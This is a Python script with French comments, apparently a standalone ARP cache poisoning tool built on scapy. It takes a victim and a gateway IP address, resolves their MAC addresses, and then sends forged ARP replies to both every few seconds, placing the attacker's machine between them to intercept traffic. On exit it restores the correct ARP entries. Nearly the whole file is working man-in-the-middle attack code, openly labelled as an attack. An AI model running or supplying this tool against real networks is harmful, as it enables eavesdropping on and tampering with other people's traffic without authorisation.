from sys import exit, platform
from termcolor import colored
from os import system as cmd
from scapy.all import *
from time import sleep
import argparse
import icmplib


# - Affichage graphique propre :

cmd('cls') if platform == "win32" else cmd('clear')


print(colored(""" 
 ________      ________      ________   
|\   __  \    |\   ____\    |\   __  \  
\ \  \|\  \   \ \  \___|    \ \  \_\  \ 
 \ \   __  \   \ \  \        \ \   ____|
  \ \  \ \  \ __\ \  \____  __\ \  \___|
   \ \__\ \__\\\\__\ \_______\\\\__\ \__\   
    \|__|\|__\|__|\|_______\|__|\|__| """, 

'green'), 

colored("""      
    --< Arp cache poisoning python tool 
    --< by Presta\n """ , 'red' ))

# ----------------------- Arguments :

parser = argparse.ArgumentParser("python3 acp.py")

parser.add_argument(
    "-s",
    "--switch-ip",
    help="L'adresse IP de la passerelle.\n",
    required=True,
)
parser.add_argument(
    "-i",
    "--victim-ip",
    help="L'adresse IP de la victime.\n",
    required=True
) 

args = parser.parse_args()  ; ip_add = args.victim_ip ; passerelle = args.switch_ip 


# -------------------------------------------- Fonctions :

# - Pinger :
def pinger(ip_add):
    
    try:   
        stats = icmplib.ping(ip_add, count=2)
        print(colored("------------", 'white'), colored(f"\nSent : {stats.packets_sent} , Received : {stats.packets_received} \nPacket lost         : {stats.packet_loss}\n", 'blue'))
    
    except icmplib.exceptions.NameLookupError:
        
        print(colored("[!] Impossible de résoudre l'adrsse IP.", "red"), "\n")
        exit()
        
    except icmplib.exceptions.SocketPermissionError:
        
        print(colored("[!] Ce programme nécessite des privilèges root !",'red'))
        exit()
               
    if str(stats.packet_loss) == "1.0" :
        
        print(colored("[!] L'hôte ne répond pas au packets ICMP.", "red"))
        
    elif str(stats.packet_loss) == "0.0":
        
        print(colored("[i] L'hote répond au paquets icmp", 'Yellow'))

# - Adresse mac recup
def macrecup(ip):
    try:
        arppacket = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.all.ARP(op=1, pdst=ip)
        targetmac = srp( arppacket, timeout=2 , verbose= False ) [0][0][1].hwsrc
    except:
        print(colored(f"[!] Impossible de récuperer l'adresse MAC de {ip}", 'red'), "\n")
        exit()

    return targetmac

# - Exploit
def empoisonement_arp(ipvict, macvict, sourceip):
    arppkt = scapy.all.ARP(op=2 , pdst=ipvict, psrc=sourceip, hwdst=macvict)
    send(arppkt, verbose=False)

# --------------------------------------------

print(colored(f"Envoi de 2 paquets ICMP à {ip_add}...", 'blue'))
pinger(ip_add)
print(colored(f"Envoi de 2 paquets ICMP à {passerelle} ...", 'blue'))
pinger(passerelle)


# - Récupération des adrsse mac :

mac_victime = macrecup(ip_add)
mac_passerelle = macrecup(passerelle)

# - Infos :

print("\n-------------------------------------------")
print(colored(f"[i] Victime    Ip / MAC  -> {ip_add}  : {mac_victime}", 'yellow'))
print(colored(f"[i] Passerelle Ip / MAC  -> {passerelle} : {mac_passerelle}", 'yellow'))

# -- Empoisonement

print(colored("\n[+] Lancement de l'attaque ... ", "green"))  
print(colored("[i] Taper controle + C pour quitter le programme.",'yellow'))
print(colored("[+] Attaque lancée avec succès",'green'))

try:    
    while True:
        empoisonement_arp(ip_add, mac_victime, passerelle)
        empoisonement_arp(passerelle, mac_passerelle, ip_add)
        sleep(7)

except KeyboardInterrupt:
    
    packet = scapy.all.ARP(op=2 , hwsrc=mac_passerelle , psrc=passerelle, hwdst=mac_victime , pdst=ip_add)
    packet2 = scapy.all.ARP(op=2 , hwsrc=mac_victime , psrc=ip_add, hwdst=mac_passerelle , pdst=passerelle)
    send(packet) ; send(packet2)
    print(colored("\n[i] Les tables cam ont été restoré", "yellow")) 
    print(colored("[!] Exiting...", 'red')) 
